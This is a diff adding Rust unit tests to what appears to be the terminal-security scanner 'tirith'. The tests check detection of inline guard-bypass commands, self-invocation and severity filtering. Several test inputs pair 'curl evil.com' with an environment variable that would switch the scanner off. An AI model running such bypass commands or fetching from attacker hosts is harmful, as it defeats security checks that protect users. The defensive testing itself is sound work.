+    fn test_no_inline_bypass_powershell_wrong_value() {
+        assert!(!find_inline_bypass(
+            "$env:TIRITH=\"1\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_no_inline_bypass_powershell_other_var() {
+        assert!(!find_inline_bypass(
+            "$env:FOO=\"0\"; curl evil.com",
+            ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_no_inline_bypass_powershell_in_posix_mode() {
+        // PowerShell syntax should NOT match when shell is Posix
+        assert!(!find_inline_bypass(
+            "$env:TIRITH=\"0\"; curl evil.com",
             ShellType::Posix
         ));
     }
@@ -1333,6 +1470,17 @@ mod tests {
     }
 
     #[test]
+    fn test_not_self_invocation_command_v() {
+        // `command -v tirith` is a lookup, not execution
+        assert!(!is_self_invocation("command -v tirith", ShellType::Posix));
+    }
+
+    #[test]
+    fn test_not_self_invocation_command_upper_v() {
+        assert!(!is_self_invocation("command -V tirith", ShellType::Posix));
+    }
+
+    #[test]
     fn test_self_invocation_time_p() {
         assert!(is_self_invocation(
             "time -p tirith diff url",
@@ -1354,6 +1502,74 @@ mod tests {
             "curl https://evil.com",
             ShellType::Posix
         ));
+    }
+
+    #[test]
+    fn test_paranoia_filter_suppresses_info_low() {
+        use crate::verdict::{Finding, RuleId, Severity, Timings, Verdict};
+
+        let findings = vec![
+            Finding {
+                rule_id: RuleId::VariationSelector,
+                severity: Severity::Info,
+                title: "info finding".into(),
+                description: String::new(),
+                evidence: vec![],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            },
+            Finding {
+                rule_id: RuleId::InvisibleWhitespace,
+                severity: Severity::Low,
+                title: "low finding".into(),
+                description: String::new(),
+                evidence: vec![],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            },
+            Finding {
+                rule_id: RuleId::HiddenCssContent,
+                severity: Severity::High,
+                title: "high finding".into(),
+                description: String::new(),
+                evidence: vec![],
+                human_view: None,
+                agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
+            },
+        ];
+
+        let timings = Timings {
+            tier0_ms: 0.0,
+            tier1_ms: 0.0,
+            tier2_ms: None,
+            tier3_ms: None,
+            total_ms: 0.0,
+        };
+
+        // Default paranoia (1): only Medium+ shown
+        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
+        filter_findings_by_paranoia(&mut verdict, 1);
+        assert_eq!(
+            verdict.findings.len(),
+            1,
+            "paranoia 1 should keep only High+"
+        );
+        assert_eq!(verdict.findings[0].severity, Severity::High);
+
+        // Paranoia 2: still only Medium+ (free tier cap)
+        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
+        filter_findings_by_paranoia(&mut verdict, 2);
+        assert_eq!(
+            verdict.findings.len(),
+            1,
+            "paranoia 2 should keep only Medium+"
+        );
     }
 
     #[test]
@@ -1405,9 +1621,7 @@ mod tests {
     fn test_enrich_pro_view_content() {
         use crate::verdict::{Evidence, Finding, RuleId, Severity};
 
-        // Table of (rule_id, expected human_view substring, expected agent_view substring)
         let cases: Vec<(RuleId, &str, &str)> = vec![
-            // Existing 7
             (
                 RuleId::HiddenCssContent,
                 "hidden via CSS",
@@ -1443,7 +1657,6 @@ mod tests {
                 "clipboard HTML not visible",
                 "full clipboard",
             ),
-            // Terminal (7 new)
             (
                 RuleId::UnicodeTags,
                 "tags render as zero-width",
@@ -1479,7 +1692,6 @@ mod tests {
                 "ANSI escapes render as colors",
                 "raw escape sequences",
             ),
-            // Config (3 new)
             (
                 RuleId::ConfigInjection,
                 "Injection blends",
@@ -1495,7 +1707,6 @@ mod tests {
                 "Non-ASCII may look identical",
                 "different codepoints",
             ),
-            // MCP (2 new)
             (
                 RuleId::McpSuspiciousArgs,
                 "Shell metacharacters",
@@ -1506,7 +1717,6 @@ mod tests {
                 "HTTP URL looks normal",
                 "insecure HTTP transport",
             ),
-            // Cloaking (1 new)
             (
                 RuleId::ServerCloaking,
                 "benign content to human",
@@ -1514,7 +1724,6 @@ mod tests {
             ),
         ];
 
-        // Build findings for each enriched rule
         let mut findings: Vec<Finding> = cases
             .iter()
             .map(|(rule_id, _, _)| Finding {
@@ -1527,6 +1736,8 @@ mod tests {
                 }],
                 human_view: None,
                 agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
             })
             .collect();
 
@@ -1587,6 +1798,8 @@ mod tests {
                 }],
                 human_view: None,
                 agent_view: None,
+                mitre_id: None,
+                custom_rule_id: None,
             })
             .collect();
 
